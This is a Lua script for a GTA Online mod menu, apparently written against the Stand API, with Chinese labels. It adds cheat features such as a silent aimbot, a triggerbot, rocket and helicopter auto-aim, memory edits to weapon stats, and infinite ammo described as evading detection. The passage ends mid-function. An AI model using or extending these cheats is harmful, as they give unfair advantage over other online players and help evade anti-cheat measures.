menu.toggle_loop(funfeatures_self, "打坐", {"carpetride"}, "", function()
    carpetridexx()
end,function()
TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
	ENTITY.DETACH_ENTITY(players.user_ped(), true, false)
	ENTITY.SET_ENTITY_VISIBLE(object, false, false)
	entities.delete_by_handle(object)
	state = 0
end)

local ls_driveonair
walkonwater = false
menu.toggle(funfeatures_self, "在水上行走", {"walkonwater"}, "",  function(on)
    walkonwater = on
    if on then
        menu.set_value(ls_driveonair, false)
    end
end)

menu.toggle_loop(funfeatures_self, "一拳超人", {""}, "", function()
    supermanpersonl()
end)

menu.toggle_loop(funfeatures_self,"抛掷载具", {"throwcars"}, "在载具附近按E将载具抬起来,在按E将载具投掷出去.", function(on)
    handthrowvehs()
end)

menu.toggle_loop(funfeatures_self,"抛掷NPC", {"throwpeds"}, "在NPC附近按E将NPC抬起来,在按E将NPC投掷出去.", function(on)
    handthrowpeds()
end)

menu.toggle(selflist, "平民", {}, ":)", function(toggle)
    PED.SET_ENABLE_HANDCUFFS(players.user_ped(), toggle) --handcuff on / off
end)

menu.toggle_loop(funfeatures_self, "大B斗", {""}, "不要动鼠标", function()
    bigpussy()
end, function ()
	TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
	ENTITY.DETACH_ENTITY(PLAYER.PLAYER_PED_ID(), true, false)
	ENTITY.SET_ENTITY_VISIBLE(object, false)
	entities.delete_by_handle(object)
	state = 0
end)
    
menu.toggle(selflist, "空中游泳", {}, "", function(on)
    if on then
        menu.trigger_commands("swiminair on")
    else
        menu.trigger_commands("swiminair off")
    end
end)


menu.toggle_loop(selflist, "警察无视", {}, "", function(toggle)
    PLAYER.SET_POLICE_IGNORE_PLAYER(PLAYER.PLAYER_ID(), toggle)
end)

menu.toggle_loop(selflist, "所有人无视", {}, "", function(toggle)
    PLAYER.SET_EVERYONE_IGNORE_PLAYER(PLAYER.PLAYER_ID(), toggle)
end)

menu.toggle_loop(selflist, "行动无声", {}, "", function()
    PLAYER.SET_PLAYER_NOISE_MULTIPLIER(PLAYER.PLAYER_ID(), 0.0)
end)

menu.action(funfeatures_self, "警察", {}, "成为警察", function()
    becomepoliceman()
end)

menu.action(funfeatures_self, "拉屎", {}, "", function()
    personlshit()
end)

menu.action(funfeatures_self, "打飞机", {}, "我还需要解释这个吗", function()
    personlhitplane()
end)

local weapon_options = menu.list(menu.my_root(), "武器选项", {}, "")

finger_thing = menu.list(weapon_options, "手指枪 [B键]", {}, "")
fingergun()

anti_aim_root = menu.list(weapon_options, "反瞄准", {"antiaim"}, "防止玩家直接瞄准你。大多数挂壁不会受到该保护措施的影响。")
anti_aim = false
menu.toggle(anti_aim_root, "反瞄准", {"antiaim"},  "防止玩家直接瞄准你。大多数挂壁不会受到该保护措施的影响。", function(on)
    anti_aim = on
    mod_uses("player", if on then 1 else -1)
end)

anti_aim_notify = false
menu.toggle(anti_aim_root, "当我被瞄准时通知我", {""},  "", function(on)
    anti_aim_notify = on
end)

anti_aim_angle = 2
menu.click_slider(anti_aim_root, "反瞄准角度", {"antiaimangle"}, "基本上是你周围的半径，玩家必须瞄准这个半径，以防反瞄准阻止", 0, 180, 2, 1, function(s)
    anti_aim_angle = s
end)

local anti_aim_type = 1
menu.list_select(anti_aim_root, "反瞄准方法", {"antiaimmethod"}, "如何使用反瞄准",  anti_aim_types, 1, function(index)
    anti_aim_type = index
end)

triggerbot_root = menu.list(weapon_options, "扳机机器人", {}, "扳机机器人将让你的武器自动开火当你将武器正确的瞄准到某个目标时，允许你非常准确地快速瞄准敌人。")

menu.toggle_loop(triggerbot_root, "扳机机器人", {"triggerbot"},  "扳机机器人将让你的武器自动开火当你将武器正确的瞄准到某个目标时，允许你非常准确地快速瞄准敌人。", function(on)
    trigger(on)
end)

menu.click_slider(triggerbot_root, "射击镜头之间的延迟", {}, "每次 \"射击\" 之间的延迟.", 10, 5000, 100, 1, function(s)
    triggerbot_delay = s
end)
    
    custom_weapon_save = menu.list(weapon_options, '武器保存', {}, '')
    
    save_loadout = custom_weapon_save:action("保存武器", {}, "保存所有当前装备的武器及其附件，以便将来装载", function()
        Save_Weapon_Profile()
    end)

    load_loadout = custom_weapon_save:action("加载上次保存武器", {"loadloadout"}, "装备上次保存的每一件武器", function()
        Load_Out_Weapon()
    end)

    auto_load = custom_weapon_save:toggle("自动加载", {}, "加入新战局时，自动装备上次保存的每件武器", function(on)
        Auto_Load_Out_Weapon(on)
    end)

    from_scratch = custom_weapon_save:action("从头开始", {}, "删除你当前的武器，这样你就可以按照你想要的方式构建你的装备",function()
        Dele_All_Weapon()
    end)

    custom_weapon_save:divider("编辑武器")

    Weapon_Check_Save()

    local weaponsetting = menu.list(weapon_options, '武器设置', {}, '')


    menu.toggle_loop(weaponsetting, '无后坐力', {'JSnoRecoil'}, '使用武器射击时不会抖动游戏画面.', function()
        gunpro()
    end, function()
        resetWeapons(modifiedRecoil)
    end)

    menu.toggle_loop(weaponsetting, '无限范围', {'JSinfiniteRange'}, '', function()
        maxrange()
    end, function()
        for hash, _ in pairs(modifiedRange) do
            memory.write_float(modifiedRange[hash].minAddress, modifiedRange[hash].originalMin)
            memory.write_float(modifiedRange[hash].maxAddress, modifiedRange[hash].originalMax)
            memory.write_float(modifiedRange[hash].rangeAddress, modifiedRange[hash].originalRange)
            modifiedRange[hash] = nil
        end
    end)


    menu.toggle_loop(weaponsetting, '无扩散', {'JSnoSpread'}, '', function()
        nospread()
    end, function()
        resetWeapons(modifiedSpread)
    end)

    menu.toggle_loop(weaponsetting, '移除前摇', {'JSnoSpinUp'}, '移除加特林和寡妇制造者的前摇.', function()
        nospinup()
    end, function()
        for i = 1, #modifiedSpinup do
            if modifiedSpinup[i].address then
                memory.write_float(modifiedSpinup[i].address, 0.5)
            end
        end
    end)

    menu.toggle_loop(weaponsetting, '子弹伤害修改', {'JSbulletForceMultiplier'}, '从正面射击载具时效果最佳.\n显示的值以百分比为单位.', function()
        damagemoded()
    end, function()
        resetWeapons(modifiedCarForce)
        resetWeapons(modifiedHeliForce)
        resetWeapons(modifiedPedForce)
    end)

    menu.divider(weaponsetting, '瞄准视野')

    menu.toggle_loop(weaponsetting, '启用瞄准视野缩放', {'JSenableAimFov'}, '让您在瞄准时修改视野大小.', function()
        gunzoom()
    end, function()
        resetWeapons(modifiedAimFov)
    end)

    menu.divider(weaponsetting, '放大瞄准视野')

    menu.toggle_loop(weaponsetting, '启用放大瞄准视野缩放', {'JSenableZoomFov'}, '让您在瞄准放大时修改视野大小.', function()
        enablezoomfov()
    end, function()
        resetWeapons(modifiedZoomFov)
    end)

    menu.slider_float(weaponsetting, '放大瞄准视野', {'JSzoomAimFov'}, '', 100, 9999999999, 100, 1, function(value)
        zoomaimfov(value)
    end)


    local proxysticks = menu.list(weapon_options, '粘弹自动爆炸', {}, '')


    menu.toggle_loop(proxysticks, '粘弹自动爆炸', {'JSproxyStickys'}, '使您的粘弹在玩家或NPC附近时自动引爆.', function()
        proxyStickys()
    end)

    menu.toggle(proxysticks, '引爆附近的玩家', {'JSProxyStickyPlayers'}, '如果您的粘性炸弹在玩家附近时自动引爆.', function(toggle)
        proxyStickys_players(toggle)
    end, proxyStickySettings.players)

    menu.toggle(proxysticks, '引爆附近的NPC', {'JSProxyStickyNpcs'}, '如果您的粘性炸弹在NPC附近时自动引爆.', function(toggle)
        proxystickys_npc(toggle)
    end, proxyStickySettings.npcs)

    menu.slider(proxysticks, '爆炸半径', {'JSstickyRadius'}, '粘性炸弹必须离目标多近才会引爆.', 1, 10, proxyStickySettings.radius, 1, function(value)
        proxysticks_radius(value)
    end)

    menu.action(proxysticks, '移除所有粘性炸弹', {'JSremoveStickys'}, '移除所有存在的粘性炸弹(不仅仅是你的).', function()
        WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(util.joaat('weapon_stickybomb'), false)
    end)

weapon_thing = menu.list(weapon_options, "子弹类型", {}, "")
bulletchange()

entity_control = menu.list(weapon_options, "实体控制枪", {}, "控制你所瞄准的实体")

menu.toggle_loop(entity_control, "开启", {}, "", function()
    entitycontrol()
end)

menu.action(entity_control, "清除记录的实体", {}, "", function()
    clearcontrollog()
end)

menu.divider(entity_control, "实体控制")


local nuke = menu.list(weapon_options, '核弹选项', {}, '')


---@diagnostic disable-next-line: undefined-global
mutually_exclusive_weapons[#mutually_exclusive_weapons + 1] = menu.mutually_exclusive_toggle(nuke, '核弹枪', {'JSnukeGun'}, '使火箭炮发出的子弹变成核弹.', mutually_exclusive_weapons, function(toggle)
    nukegunmode(toggle)
end)


menu.action(nuke, '核弹标记点', {'JSnukeWP'}, '掉落一颗核弹在您标记的位置.', function ()
    nukepoint()
end)

---@diagnostic disable-next-line: undefined-global
menu.slider(nuke, '核弹高度', {'JSnukeHeight'}, '投下核弹的高度.', 10, 100, nuke_height, 10, function(value)
    nukeheight(value)
end)


local throwables = menu.list(weapon_options, '投掷物发射器', {}, '')


---@diagnostic disable-next-line: undefined-global
mutually_exclusive_weapons[#mutually_exclusive_weapons + 1] = menu.mutually_exclusive_toggle(throwables, '投掷物发射器', {'JSgrenade'}, '使榴弹发射器能够发射可选的投掷物.', mutually_exclusive_weapons, function(toggle)
    throwablebullet(toggle)
end)


local throwables_launcher_list throwables_launcher_list = menu.list_action(throwables, '当前投掷物' ..': Grenade', {}, '选择榴弹发射器发射的投掷物.', getLabelTableFromKeys(throwablesTable), function(index, text)
    menu.set_menu_name(throwables_launcher_list, '当前投掷物' ..': '.. text)
    bulletset(text)
end)

local minecraftgun = menu.list(weapon_options, '我的世界枪', {}, '')

menu.toggle_loop(minecraftgun, '我的世界枪', {'JSminecraftGun'}, '当您射击时生成阻挡物.', function()
    xxxminecraftgun()
end)

menu.action(minecraftgun, '删除最后一个阻挡物', {'JSdeleteLastBlock'}, '', function()
    deleminecraftlastblock()
end)

menu.action(minecraftgun, '删除所有阻挡物', {'JSdeleteBlocks'}, '', function()
    deleallblock()
end)

local Gun_Effect_Shooting_Hit = menu.list(weapon_options, "开枪效果", {}, "")

menu.toggle_loop(weapon_options, '喷火器', {'JSflamethrower'}, '将加特林变成火焰喷射器.', function()
    flamegun()
end)

menu.toggle_loop(Gun_Effect_Shooting_Hit, "射击效果", {"shootingfx"}, "", function ()
    shootingeffect()
end)

menu.textslider_stateful(Gun_Effect_Shooting_Hit, "设置射击效果", {}, "", {"小丑木兹","小丑花"}, function (index)
	setshootingeffect(index)
end)

menu.toggle_loop(weapon_options, "磁铁枪", {"magnetgun"}, "", function ()
    magnetgun()
end)

menu.textslider_stateful(weapon_options, "设置磁铁枪", {}, "", {"平滑的", "混沌模式"}, function(index)
	setmagnetgun(index)
end)

menu.toggle_loop(weapon_options, "空袭枪", {"airstrikegun"}, "", function()
    airstgun()
end)

menu.toggle_loop(weapon_options, "子弹更改器", {"bulletchanger"}, "", function ()
    bulletchanger()
end)

menu.list_select(weapon_options, "设置武器子弹", {}, "", {
	{util.get_label_text("WT_A_RPG")}, {util.get_label_text("WT_FWRKLNCHR")},
	{util.get_label_text("WT_RAYPISTOL")}, {util.get_label_text("WT_GL")},
	{util.get_label_text("WT_MOLOTOV")}, {util.get_label_text("WT_SNWBALL")},
	{util.get_label_text("WT_FLAREGUN")}, {util.get_label_text("WT_EMPL")},}, 1, function(opt)
        bulletchanger_set(opt)
end)


local hitEffectRoot <const> = menu.list(Gun_Effect_Shooting_Hit, "命中效果", {}, "")

menu.toggle_loop(hitEffectRoot, "命中效果", {"hiteffects"}, "", function()
	hittingeffect()
end)

menu.list_select(hitEffectRoot, "设置效果", {}, "", hiteffectchinese, 1, function (opt)
	sethiteffect(opt)
end)

local SetEffectColour = function(colour) effectColour = colour end

local menuColour = menu.colour(hitEffectRoot, "颜色", {"effectcolour"}, "仅对某些效果有效", effectColour, false, SetEffectColour)
menu.rainbow(menuColour)


menu.toggle(weapon_options, '友好枪', {'JSfriendlyFire'}, '使您射击NPC时让他们不会攻击您.', function(toggle)
    friendshipgun(toggle)
end)

menu.toggle_loop(weapon_options, "磁铁实体", {"magnetents"}, "射击两个实体以让它们互相吸引", function()
	magnetents()
end, function ()
	counter = 0
	shotEntities = {}; entityPairs = {}
end)


menu.toggle_loop(weapon_options, '热成像枪', {'JSthermalGuns'}, '当您瞄准时按"E"可以启用热成像功能.', function()
    thermalgun()
end)

menu.toggle_loop(weapon_options, '超级冲锋', {}, '使用近战时将附近模型推开', function ()
	supeerrunning()
end)

menu.toggle(weapon_options, "女武神火箭", {"valkrocket"}, "", function(toggle)
    rocketgo(toggle)
end)

menu.action(weapon_options, "发射引导导弹", {"missile"}, "", function()
	if not UFO.exists() then GuidedMissile.create() end
end)

menu.toggle(weapon_options, "可以射击队友", {}, '使你在游戏中能够射击队友', function(toggle)
    PED.SET_CAN_ATTACK_FRIENDLY(PLAYER.PLAYER_PED_ID(), toggle, false)
end)

aim_info = false
menu.toggle(weapon_options, "瞄准信息", {}, "显示您瞄准的实体的信息", function(on)
    aim_info = on
end)

gun_stealer = false
menu.toggle(weapon_options, "偷车枪", {}, "射击车辆以窃取它, 如果是带有玩家司机的汽车,它会将您传送到下一个可用座位.", function(on)
    gun_stealer = on
end)

paintball = false
menu.toggle(weapon_options, "彩弹枪", {}, "射击车辆，它会变成随机颜色！ 由于实体所有权，您可能需要多射击几次。", function(on)
    paintball = on
end)

drivergun = false
menu.toggle(weapon_options, "NPC驾驶枪", {}, "射击车辆以插入一个NPC司机，该司机会将车辆开到一个随机区域。 由于实体所有权，您可能需要多射击几次。", function(on)
    drivergun = on
end)

grapplegun = false
menu.toggle(weapon_options, "绳索枪", {}, "" , function(on)
    grapplegun = on
    if on then
        WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), util.joaat('weapon_pistol'), 9999, false, false)
        notification("绳索枪现已激活！ 用手枪射击某处。 擒抱时按 R 可停止擒抱。", colors.blue)
    end
end)

menu.toggle(weapon_options, "隐形武器", {}, "使你的武器隐形。 可能仅限本地。 切换武器时需要重新开启。", function(on)
    local plyr = players.user_ped()
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(plyr, not on, false, false, false) 
end)

menu.toggle_loop(weapon_options, '翻滚时自动换弹夹', {}, '当你做翻滚动作时更换弹夹', function()
    runreload()
end)

menu.toggle(weapon_options, "无限弹药", { "inf_ammo" }, '可以避免子弹过多的检测', function(toggle)
    unlimitedbullet(toggle)
end)

menu.toggle_loop(weapon_options, "锁定弹药", { "lock_ammo" }, "锁定当前武器为最大弹药", function()
    lockthebullet()
end)

local pvphelp = menu.list(menu.my_root(), "PvP助手", {"pvphelp"}, "")

menu.divider(pvphelp, "静默自瞄")

local silent_aimbotroot = menu.list(pvphelp, "静默自瞄1.0", {"lancescriptsilentaimbot"}, "")

menu.toggle(silent_aimbotroot, "静默自瞄", {"saimbottoggle"}, "", function(on) SE_Notifications = true
    silent_aimbot = on
    start_silent_aimbot()
end)

menu.toggle(silent_aimbotroot, "静默自瞄玩家", {"saimbotplayers"}, "", function(on)
    satarget_players = on
end)

menu.toggle(silent_aimbotroot, "静默自瞄NPC\'s", {"saimbotpeds"}, "", function(on)
    satarget_npcs = on
end)

menu.toggle(silent_aimbotroot, "用视野指定范围", {"saimbotusefov"}, "你不会通过你的屁眼杀人", function(on)
    satarget_usefov = on
end)

menu.slider(silent_aimbotroot, "视野", {"saimbotfov"}, "", 1, 270, 180, 1, function(s)
    sa_fov = s
end)

menu.toggle(silent_aimbotroot, "忽略车内目标", {"saimbotnovehicles"}, "如果你想装的更像个正常人, 或者射车内目标时遇到问题", function(on)
    satarget_novehicles = on
end)

satarget_nogodmode = true
menu.toggle(silent_aimbotroot, "忽略无敌目标", {"saimbotnogodmodes"}, "因为这有什么意义？", function(on)
    satarget_nogodmode = on
end, true)

menu.toggle(silent_aimbotroot, "好友成为目标", {"saimbottargetfriends"}, "", function(on)
    satarget_targetfriends = on
end)

menu.toggle(silent_aimbotroot, "伤害修改", {"saimbotdmgo"}, "", function(on)
    satarget_damageo = on
end)

menu.slider(silent_aimbotroot, "伤害修改的数值", {"saimbotdamageoverride"}, "", 1, 1000, 100, 1, function(s)
    sa_odmg = s
end)

menu.toggle_loop(pvphelp, "静默自瞄2.0", {}, "", function ()
    if PED.IS_PED_SHOOTING(GetLocalPed()) then --main start, checking.
        Silent_Aimbot.hash = WEAPON.GET_SELECTED_PED_WEAPON(GetLocalPed())
        local suitable = GetSuitableAimbotTarget(Silent_Aimbot.fov, Silent_Aimbot.fov_check,
            Silent_Aimbot.dist, Silent_Aimbot.los_check)

        if suitable ~= nil then
            local hitboxesCheckCount = 0
            for i, v in pairs(Silent_Aimbot.hitboxes) do
                if (v.toggled) then
                    ShootBulletAtPedBone(suitable, v.hash, Silent_Aimbot.dmg,
                        Silent_Aimbot.hash, Silent_Aimbot.advanced.speed)
                        if SE_Notifications then util.toast("射击 " .. i .. " 玩家的 " .. GetPlayerName_ped(suitable)) end
                        break
                else
                    hitboxesCheckCount = hitboxesCheckCount + 1
                end
            end
            if (hitboxesCheckCount == 3) then
                util.toast("没有选择打击点")
            end
        end
    end
end)


local aimbot_settings = menu.list(pvphelp, "静默自瞄2.0设置", {}, "")
menu.divider(aimbot_settings, "---Settings---")
menu.slider(aimbot_settings, "伤害", {"saimdmg", "silentdamage"}, "伤害。 可能不准确。", 1, 10000, 100, 10, function (v) Silent_Aimbot.dmg = v end)
menu.slider(aimbot_settings, "范围", {"saimrange", "silentrange"}, "静默自瞄范围", 1, 10000, 300, 100, function (v) Silent_Aimbot.dist = v end)
menu.slider(aimbot_settings, "视野", {"saimfov", "silentfov"}, "静默自瞄视野", 1, 1000, 20, 1, function (v) Silent_Aimbot.fov = v/10 end)
menu.toggle(aimbot_settings, "视野检查", {}, "禁用视野检查。", function (toggle) Silent_Aimbot.fov_check = toggle end, true)
menu.toggle(aimbot_settings, "视线检查", {}, "禁用视线检查。", function (toggle) Silent_Aimbot.los_check = toggle end, true)
menu.divider(aimbot_settings, "---打击点---")
menu.toggle(aimbot_settings, "头", {"saimhead", "silenthead"}, "切换头部打击点。", function (toggle) Silent_Aimbot.hitboxes.head.toggled = toggle end)
menu.toggle(aimbot_settings, "脊柱/身体", {"saimspine", "saimbody", "silentbody"}, "切换身体打击点。", function (toggle) Silent_Aimbot.hitboxes.spine.toggled = toggle end)
menu.toggle(aimbot_settings, "骨盆", {"saimpelvis", "silentpelvis"}, "切换骨盆打击点。", function (toggle) Silent_Aimbot.hitboxes.pelvis.toggled = toggle end)
menu.divider(aimbot_settings, "---额外功能---")
menu.slider(aimbot_settings, "设定速度", {"silentspeed"}, "设置子弹的速度。 默认值为 -1。", -1, 2147483647, -1, 10, function (v) Silent_Aimbot.advanced.speed = v end)

menu.divider(pvphelp,"车辆瞄准器")

menu.toggle_loop(pvphelp, "直升飞机自动瞄准器", {}, "使直升机瞄准最近的玩家。 将其与“静默自瞄”结合使用，让您看起来超级棒 :)", function ()
    local p = GetClosestPlayerWithRange_Whitelist(200)
    local localped = GetLocalPed()
    local localcoords2 = ENTITY.GET_ENTITY_COORDS(localped)
    if p ~= nil and not PED.IS_PED_DEAD_OR_DYING(p) and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(localped, p, 17) and not AIM_WHITELIST[NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p)] and (not players.is_in_interior(NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p))) and (not players.is_godmode(NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p))) then
        if PED.IS_PED_IN_ANY_VEHICLE(localped) then
            local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
            if VEHICLE.GET_VEHICLE_CLASS(veh) == 15 or VEHICLE.GET_VEHICLE_CLASS(veh) == 16 then --vehicle class of heli
                --did all prechecks, time to actually face them
                -- local pcoords = PED.GET_PED_BONE_COORDS(p, 24817, 0, 0, 0)
                -- local look = util.v3_look_at(localCoords, pcoords) --x = pitch (vertical), y = roll (fuck no), z = heading (horizontal)
                local pcoords2 = PED.GET_PED_BONE_COORDS(p, 24817, 0, 0, 0)
                local look2 = v3.lookAt(localcoords2, pcoords2)
                local look = GetTableFromV3Instance(look2)
                ENTITY.SET_ENTITY_ROTATION(veh, look.x, look.y, look.z, 1, true)
            end
        end
    end
end)

menu.action(pvphelp, "修改导弹速度", {}, "", function ()
    local localped = GetLocalPed()
    if PED.IS_PED_IN_ANY_VEHICLE(localped) then
        local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
        if VEHICLE.GET_VEHICLE_CLASS(veh) == 15 or VEHICLE.GET_VEHICLE_CLASS(veh) == 16 then --vehicle class of heli
            SetVehicleMissileSpeed(VEH_MISSILE_SPEED)
        end
    end
end)

menu.slider(pvphelp, "设置导弹速度", {"vehmissilespeed"}, "设置导弹的速度。", 1, 2147483647, 10000, 100, function (value)
    VEH_MISSILE_SPEED = value
end)

menu.divider(pvphelp, "RPG自动瞄准器")


menu.toggle(pvphelp, "RPG自动瞄准器/大多数车辆", {"rpgaim"}, "更准确地说，火箭自瞄。 将与火箭设置列表中提供的火箭一起使用。 默认为 RPG。", function (on)
    if on then
        MISL_AIM = true
        while MISL_AIM do
            local localped = GetLocalPed()
            local localcoords = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
            local forOffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(localped, 0, 5, 0)
            RRocket = OBJECT.GET_CLOSEST_OBJECT_OF_TYPE(forOffset.x, forOffset.y, forOffset.z, 10, Chosen_Rocket_Hash, false, true, true, true)
            local p
            if missile_settings.multitarget then
                if missile_settings.air_target then
                    p = GetClosestPlayerWithRange_Whitelist_DisallowEntities(missile_settings.radius, MISSILE_ENTITY_TABLE, true)
                else
                    p = GetClosestPlayerWithRange_Whitelist_DisallowEntities(missile_settings.radius, MISSILE_ENTITY_TABLE, false)
                end
            elseif missile_settings.multiped then
                if missile_settings.air_target then
                    p = GetClosestNonPlayerPedWithRange_DisallowedEntities(missile_settings.radius, MISSILE_ENTITY_TABLE, true)
                else
                    p = GetClosestNonPlayerPedWithRange_DisallowedEntities(missile_settings.radius, MISSILE_ENTITY_TABLE, false)
                end
            elseif not missile_settings.multitarget then
                if missile_settings.air_target then
                    p = GetClosestPlayerWithRange_Whitelist(missile_settings.radius, true)
                else
                    p = GetClosestPlayerWithRange_Whitelist(missile_settings.radius, false)
                end
            end
            local ppcoords = ENTITY.GET_ENTITY_COORDS(p)
            ----
            if (RRocket ~= 0) and (p ~= nil) and (not PED.IS_PED_DEAD_OR_DYING(p)) and (not AIM_WHITELIST[NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p)]) and (PED.IS_PED_SHOOTING(localped)) and (not players.is_in_interior(NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(p))) and (ppcoords.z > 1) then
                util.create_thread(function ()
                    local plocalized = p
                    local msl = RRocket
                    if missile_settings.multitarget then
                        MISSILE_ENTITY_TABLE[#MISSILE_ENTITY_TABLE+1] = plocalized
                    end
                    if (ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(localped, plocalized, 17) and missile_settings.los) or not missile_settings.los or MISL_AIR then
                        if SE_Notifications then
                            util.toast("前兆完成！")
                        end
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(msl)
                        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(msl) then
                            for i = 1, 10 do
                                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(msl)
                            end
                        else
                            if SE_Notifications then
                                util.toast("有控制权")
                            end
                        end
                        local aircount = 1
                        ----
                        Missile_Camera = 0

                        --preload the fake rocket and the particle fx
                        -- > -- Load the particleFX for the fakerocket so it networks to other players
                        STREAMING.REQUEST_NAMED_PTFX_ASSET(missile_particles.dictionary)
                        while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(missile_particles.dictionary) do
                            STREAMING.REQUEST_NAMED_PTFX_ASSET(missile_particles.dictionary)
                            util.yield()
                        end
                        GRAPHICS.USE_PARTICLE_FX_ASSET(missile_particles.dictionary)
                        -- > -- we now have loaded our PTFX for our fake rocket.
                        --GRAPHICS.START_PARTICLE_FX_NON_LOOPED_ON_ENTITY("exp_grd_rpg_lod", msl, 0, 0, 0, 0, 0, 0, 2, false, false, false)
                        --while the rocket exists, we do this vvvv
                        while ENTITY.DOES_ENTITY_EXIST(msl) do
                            if SE_Notifications then
                                util.toast("rocket exists")
                            end
                            -- NEW CODE W/O DEPRECATION:
                            --local pcoords2 = v3.new(PED.GET_PED_BONE_COORDS(plocalized, 20781, 0, 0, 0))
                            local pcoords2 = ENTITY.GET_ENTITY_COORDS(plocalized)
                            local pcoords = GetTableFromV3Instance(pcoords2)
                            local lc2 = ENTITY.GET_ENTITY_COORDS(msl)
                            local lc = GetTableFromV3Instance(lc2)
                            local look2 = v3.lookAt(lc2, pcoords2)
                            local look = GetTableFromV3Instance(look2)
                            local dir2 = v3.toDir(look2)
                            local dir = GetTableFromV3Instance(dir2)
                            --didn't wanna make new fuckin variables/replace old ones, so we're multiplying the code by 2 because fuck you.
                            -- // -- // --
                            -- // -- // --
                            if missile_settings.ptfx then
                                STREAMING.REQUEST_NAMED_PTFX_ASSET(missile_particles.dictionary)
                                while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(missile_particles.dictionary) do
                                    STREAMING.REQUEST_NAMED_PTFX_ASSET(missile_particles.dictionary)
                                    util.yield()
                                end
                                GRAPHICS.USE_PARTICLE_FX_ASSET(missile_particles.dictionary)
                                -- > -- we now have loaded our PTFX for our fake rocket.
                                --(​const char* effectName, float xPos, float yPos, float zPos, float xRot, float yRot, float zRot, float scale, BOOL xAxis, BOOL yAxis, BOOL zAxis, BOOL p11)
                                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(missile_particles.name, lc.x, lc.y, lc.z, 0, 0, 0, 0.4 * missile_settings.ptfx_scale, false, false, false, true)
                            end
                            -- // -- // --
                            -- // -- // --
                            --airstrike air
                            if aircount < 2 and MISL_AIR then
                                if ENTITY.DOES_ENTITY_EXIST(msl) then
                                    --thanks ren!
                                    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(msl, 1, 0, 0, 2700, true, false, true, true)
                                    aircount = aircount + 1
                                    util.yield(1100)
                                end
                            end
                            local lookCountD = 0
                            if MISL_AIR then
                                if missile_settings.cam then
                                    if not CAM.DOES_CAM_EXIST(Missile_Camera) then
                                        if SE_Notifications then
                                            util.toast("相机设置")
                                        end
                                        CAM.DESTROY_ALL_CAMS(true)
                                        Missile_Camera = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
                                        --ATTACH_CAM_TO_ENTITY_WITH_FIXED_DIRECTION(Missile_Camera, msl, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1)
                                        CAM.SET_CAM_ACTIVE(Missile_Camera, true)
                                        CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
                                    end
                                end
                                local distx = math.abs(lc.x - pcoords.x)
                                local disty = math.abs(lc.y - pcoords.y)
                                local distz = math.abs(lc.z - pcoords.z)
                                if missile_settings.cam then
                                    local ddisst = GENERIC_SYSTEM.VDIST(pcoords.x, pcoords.y, pcoords.z, lc.x, lc.y, lc.z)
                                    if ddisst > 50 then
                                        local camcoordv3 = CAM.GET_CAM_COORD(Missile_Camera)
                                        local look3 = v3.lookAt(camcoordv3, lc2)
                                        local look4 = GetTableFromV3Instance(look3)
                                        --local look2 = util.v3_look_at(CAM.GET_CAM_COORD(Missile_Camera), lc)
                                        --local backoffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, 0, -30, 10)
                                        local backoffset = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(msl, 10, 10, -2)
                                        CAM.SET_CAM_COORD(Missile_Camera, backoffset.x, backoffset.y, backoffset.z)
                                        if lookCountD < 1 then
                                            CAM.SET_CAM_ROT(Missile_Camera, look4.x, look4.y, look4.z, 2)
                                            lookCountD = lookCountD + 1
                                        end
                                    else
                                        local camcoordv3 = CAM.GET_CAM_COORD(Missile_Camera)
                                        local look3 = v3.lookAt(camcoordv3, lc2)
                                        local look4 = GetTableFromV3Instance(look3)
                                        CAM.SET_CAM_ROT(Missile_Camera, look4.x, look4.y, look4.z, 2)
                                    end
                                end
                                --CAM.SET_CAM_PARAMS(Missile_Camera, lc.x, lc.y, lc.z + 1, look.x, look.y, look.z, 100, 0, 0, 0, 0) --(​Cam cam, float posX, float posY, float posZ, float rotX, float rotY, float rotZ, float fieldOfView, Any p8, int p9, int p10, int p11)
                                ENTITY.SET_ENTITY_ROTATION(msl, look.x, look.y, look.z, 2, true)
                                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(msl, 1, dir.x * missile_settings.speed * distx, dir.y * missile_settings.speed * disty, dir.z * missile_settings.speed * distz, true, false, true, true)
                                util.yield()
                            else
                                -- vanilla "aimbot"
                                ENTITY.SET_ENTITY_ROTATION(msl, look.x, look.y, look.z, 2, true)
                                ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(msl, 1, dir.x * missile_settings.speed, dir.y * missile_settings.speed, dir.z * missile_settings.speed, true, false, true, true)
                                util.yield()
                            end
                            --free all our v3 instances
                        end

                        --rocket has stopped existing
                        if missile_settings.cam then
                            util.yield(2000)
                            if SE_Notifications then
                                util.toast("相机删除")
                            end
                            CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
                            if CAM.IS_CAM_ACTIVE(Missile_Camera) then
                                CAM.SET_CAM_ACTIVE(Missile_Camera, false)
